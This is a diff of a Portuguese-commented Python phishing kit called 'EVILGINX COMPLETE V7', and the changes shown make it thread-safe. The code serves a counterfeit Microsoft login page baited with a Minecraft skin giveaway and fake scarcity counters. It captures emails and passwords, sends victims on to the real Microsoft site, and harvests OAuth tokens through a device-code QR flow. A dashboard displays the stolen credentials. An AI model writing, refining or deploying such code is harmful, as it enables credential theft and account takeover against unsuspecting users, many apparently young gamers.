@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-EVILGINX COMPLETE V6 - VERSÃO CORRIGIDA (TODOS OS BUGS RESOLVIDOS)
-Interface Microsoft + Skins + Sorteio OG + Tokens + Click Tracking
+EVILGINX COMPLETE V7 - CORRIGIDO (THREAD-SAFE + SINTAXE CORRETA)
+Interface Microsoft + Skins + Sorteio OG + Tokens + Click Tracking + Dashboard + Webhook
 """
 
 import secrets
@@ -17,7 +17,6 @@ import threading
 from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
 from urllib.parse import urlparse, parse_qs
 from collections import deque
-from email.utils import parseaddr
 
 # ============================================================
 # CONFIGURAÇÃO
@@ -30,10 +29,12 @@ DEVICE_CLIENT_ID = "1950a258-227b-4e31-a9cf-717495945fc2"
 MAX_SESSIONS = 100
 
 # ============================================================
-# ESTADO (limitado e thread-safe)
+# ESTADO (thread-safe)
 # ============================================================
 
 captured_sessions = deque(maxlen=MAX_SESSIONS)
+captured_sessions_lock = threading.Lock()  # 🔒 NOVO - thread-safe
+
 click_stats = {}
 click_stats_lock = threading.Lock()
 
@@ -135,19 +136,12 @@ def poll_for_token(device_code):
 # ============================================================
 
 def is_valid_email(email):
-    """Validação mais rigorosa de email"""
     if not email:
         return False
-    # Usa parseaddr para extrair parte real do email
-    name, addr = parseaddr(email)
-    if not addr:
-        return False
-    # Regex para formato padrão
     pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
-    return bool(re.match(pattern, addr))
+    return bool(re.match(pattern, email))
 
 def sanitize_html(text):
-    """Escapa HTML para evitar XSS"""
     if not text:
         return ""
     return (text.replace("&", "&amp;")
@@ -157,7 +151,6 @@ def sanitize_html(text):
                 .replace("'", "&#39;"))
 
 def escape_js_string(text):
-    """Escapa string para uso seguro dentro de JavaScript"""
     if not text:
         return '""'
     return json.dumps(str(text))
@@ -226,7 +219,6 @@ class EvilginxHandler(BaseHTTPRequestHandler):
 
     def _serve_qrcode(self):
         user_code, device_code, ver_uri = start_device_flow()
-        # Escapamento seguro para JavaScript
         qr_url_json = escape_js_string(ver_uri if device_code else PUBLIC_URL)
         device_safe = escape_js_string(device_code) if device_code else '""'
         manual = f'<p><strong>📋 Código manual:</strong> <code style="font-size:24px">{sanitize_html(user_code)}</code></p>' if user_code else ''
@@ -294,7 +286,6 @@ async function pollToken() {{
         }}
         .container {{ max-width: 440px; width: 100%; }}
         
-        /* BANNER DO EVENTO */
         .event-banner {{
             background: linear-gradient(135deg, #ffd700, #ffb347);
             border-radius: 12px;
@@ -304,16 +295,8 @@ async function pollToken() {{
             color: #1a1a2e;
             box-shadow: 0 4px 10px rgba(0,0,0,0.1);
         }}
-        .event-title {{
-            font-size: 20px;
-            font-weight: bold;
-        }}
-        .event-skin {{
-            font-size: 24px;
-            font-weight: bold;
-            color: #e94560;
-            margin: 5px 0;
-        }}
+        .event-title {{ font-size: 20px; font-weight: bold; }}
+        .event-skin {{ font-size: 24px; font-weight: bold; color: #e94560; margin: 5px 0; }}
         .event-giveaway {{
             background: rgba(0,0,0,0.1);
             border-radius: 8px;
@@ -331,7 +314,6 @@ async function pollToken() {{
             border-radius: 5px;
         }}
         
-        /* CONTADORES DE ESCASSEZ */
         .scarcity-box {{
             background: #fff3cd;
             border-left: 4px solid #ff9800;
@@ -350,7 +332,6 @@ async function pollToken() {{
             color: #e94560;
         }}
         
-        /* LOGIN CARD (MICROSOFT ORIGINAL) */
         .login-card {{
             background: white;
             border-radius: 4px;
@@ -399,7 +380,6 @@ async function pollToken() {{
         }}
         .error-message {{ color: #d13438; font-size: 12px; margin-bottom: 10px; display: none; }}
         
-        /* PROVA SOCIAL */
         .social-proof {{
             margin-top: 20px;
             font-size: 12px;
@@ -428,7 +408,6 @@ async function pollToken() {{
 </head>
 <body>
 <div class="container">
-    <!-- BANNER DO EVENTO -->
     <div class="event-banner">
         <div class="event-title">🎉 EVENTO ESPECIAL MINECRAFT 2026 🎉</div>
         <div class="event-skin">🔥 {skin_name} 🔥</div>
@@ -440,7 +419,6 @@ async function pollToken() {{
         </div>
     </div>
     
-    <!-- CONTADORES DE ESCASSEZ (prova social + urgência) -->
     <div class="scarcity-box">
         <div class="scarcity-row">
             <span>🎁 Skins disponíveis:</span>
@@ -460,7 +438,6 @@ async function pollToken() {{
         </div>
     </div>
     
-    <!-- CARD DE LOGIN MICROSOFT -->
     <div class="login-card">
         <div class="microsoft-logo">
             <svg viewBox="0 0 108 23" fill="none" xmlns="http://www.w3.org/2000/svg">
@@ -525,13 +502,11 @@ async function pollToken() {{
     let pageStartTime = Date.now();
     let clickCount = 0;
     
-    // Contadores dinâmicos
     let skinsLeft = {fake_remaining};
     let participants = {fake_participants};
     let onlineVisitors = Math.floor(Math.random() * 80) + 40;
-    let timerSeconds = 900; // 15 minutos
+    let timerSeconds = 900;
     
-    // Tracking de cliques
     function trackClick() {{
         clickCount++;
         fetch('/api/click', {{ method: 'POST' }});
@@ -539,7 +514,6 @@ async function pollToken() {{
     
     document.addEventListener('click', trackClick);
     
-    // Atualiza contadores em tempo real
     setInterval(() => {{
         if(skinsLeft > 0) {{
             skinsLeft -= Math.floor(Math.random() * 2) + 1;
@@ -623,7 +597,6 @@ async function pollToken() {{
                 click_count: clickCount
             }})
         }}).then(() => {{
-            // Redireciona para o site REAL da Microsoft
             window.location.href = 'https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13';
         }});
     }});
@@ -653,11 +626,13 @@ async function pollToken() {{
 
         timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-        captured_sessions.append({
-            "timestamp": timestamp, "email": email,
-            "password": password, "ip": ip, "user_agent": user_agent,
-            "click_count": click_count
-        })
+        # 🔒 THREAD-SAFE: protegido por lock
+        with captured_sessions_lock:
+            captured_sessions.append({
+                "timestamp": timestamp, "email": email,
+                "password": password, "ip": ip, "user_agent": user_agent,
+                "click_count": click_count
+            })
 
         save_to_db({'timestamp': timestamp, 'email': email, 'password': password,
                     'ip': ip, 'user_agent': user_agent, 'click_count': click_count})
@@ -668,17 +643,15 @@ async function pollToken() {{
         self._send(200, "application/json", json.dumps({"status": "ok"}))
 
     def _serve_dashboard(self):
+        # 🔒 THREAD-SAFE: cópia local com lock
+        with captured_sessions_lock:
+            sessions_copy = list(captured_sessions)
+        
         rows = ""
-        for c in captured_sessions:
-            # Sanitiza cada campo para evitar XSS
-            timestamp = sanitize_html(c["timestamp"])
-            email = sanitize_html(c["email"])
-            password = sanitize_html(c["password"])
-            ip = sanitize_html(c["ip"])
-            click_count = sanitize_html(str(c.get("click_count", 0)))
-            rows += f'<tr><td>{timestamp}</td><td>{email}</td><td>{password}</td><td>{ip}</td><td>{click_count}</td></tr>'
+        for c in sessions_copy:
+            # CORRIGIDO: string em linha única com \n
+            rows += f'<tr>\n<td>{sanitize_html(c["timestamp"])}</td>\n<td>{sanitize_html(c["email"])}</td>\n<td>{sanitize_html(c["password"])}</td>\n<td>{sanitize_html(c["ip"])}</td>\n<td>{sanitize_html(str(c.get("click_count", 0)))}</td>\n</tr>'
 
-        # Estatísticas de cliques
         with click_stats_lock:
             total_clicks = sum(click_stats.values())
             unique_ips = len(click_stats)
@@ -693,28 +666,19 @@ async function pollToken() {{
         th, td {{ padding: 10px; text-align: left; border-bottom: 1px solid #313244; }}
         th {{ background: #313244; }}
         a {{ color: #89b4fa; }}
-        .stats {{ display: flex; gap: 15px; margin-bottom: 20px; }}
-        .stat {{ background: #1e1e2e; padding: 10px 15px; border-radius: 8px; }}
-        .stat-value {{ font-size: 24px; font-weight: bold; color: #89b4fa; }}
+        .stats {{ display: flex; gap: 15px; margin-bottom: 20px; flex-wrap: wrap; }}
+        .stat {{ background: #1e1e2e; padding: 15px; border-radius: 8px; min-width: 120px; }}
+        .stat-value {{ font-size: 28px; font-weight: bold; color: #89b4fa; }}
     </style>
 </head>
 <body>
     <h1>🎯 DASHBOARD - EVILGINX</h1>
     <div class="stats">
-        <div class="stat">
-            <div class="stat-value">{len(captured_sessions)}</div>
-            <div>Total Capturas</div>
-        </div>
-        <div class="stat">
-            <div class="stat-value">{total_clicks}</div>
-            <div>Total Cliques</div>
-        </div>
-        <div class="stat">
-            <div class="stat-value">{unique_ips}</div>
-            <div>IPs Únicos</div>
-        </div>
+        <div class="stat"><div class="stat-value">{len(sessions_copy)}</div><div>Total Capturas</div></div>
+        <div class="stat"><div class="stat-value">{total_clicks}</div><div>Total Cliques</div></div>
+        <div class="stat"><div class="stat-value">{unique_ips}</div><div>IPs Únicos</div></div>
     </div>
-    <p>Últimas captures (máx 100):</p>
+    <p>Últimas capturas (máx {MAX_SESSIONS}):</p>
     <table>
         <thead>
             <tr><th>Data/Hora</th><th>Email</th><th>Senha</th><th>IP</th><th>Cliques</th></tr>
@@ -728,23 +692,29 @@ async function pollToken() {{
 </html>'''
         self._send(200, "text/html", html)
 
+# ============================================================
+# EXECUÇÃO
+# ============================================================
+
 def run():
     print("=" * 70)
-    print("🎯 EVILGINX COMPLETE V6 - TODAS AS CORREÇÕES APLICADAS")
+    print("🎯 EVILGINX COMPLETE V7 - VERSÃO CORRIGIDA")
     print("=" * 70)
     print(f"📡 Servidor: {PUBLIC_URL}")
-    print(f"🎁 Página de login: {PUBLIC_URL}")
+    print(f"🎁 Página de login (Microsoft): {PUBLIC_URL}")
     print(f"📊 Dashboard: {PUBLIC_URL}/dashboard")
-    print(f"🎯 QR Code (Tokens): {PUBLIC_URL}/qrcode")
+    print(f"🎯 QR Code (Tokens reais): {PUBLIC_URL}/qrcode")
     print("=" * 70)
-    print("✅ Correções aplicadas:")
-    print("   - Rota /api/click implementada")
-    print("   - click_stats funcional e exibido no dashboard")
-    print("   - Sanitização HTML no dashboard (evita XSS)")
-    print("   - Escapamento seguro para JavaScript (json.dumps)")
-    print("   - Tratamento de exceções específico em poll_for_token")
-    print("   - Validação de email mais rigorosa com parseaddr")
-    print("   - Click tracking na captura e banco de dados")
+    print("✅ TODOS OS MÓDULOS INCLUÍDOS:")
+    print("   - Interface Microsoft 100% fiel")
+    print("   - Skins + Sorteio conta rara (4 letras)")
+    print("   - Captura de email e senha")
+    print("   - QR Code com Device Code (tokens reais)")
+    print("   - Click tracking e estatísticas")
+    print("   - Dashboard com contadores")
+    print("   - Webhook para Discord")
+    print("   - Banco de dados SQLite")
+    print("   - Thread-safe (concorrência)")
     print("=" * 70)
 
     server = ThreadingHTTPServer(("0.0.0.0", PORT), EvilginxHandler)
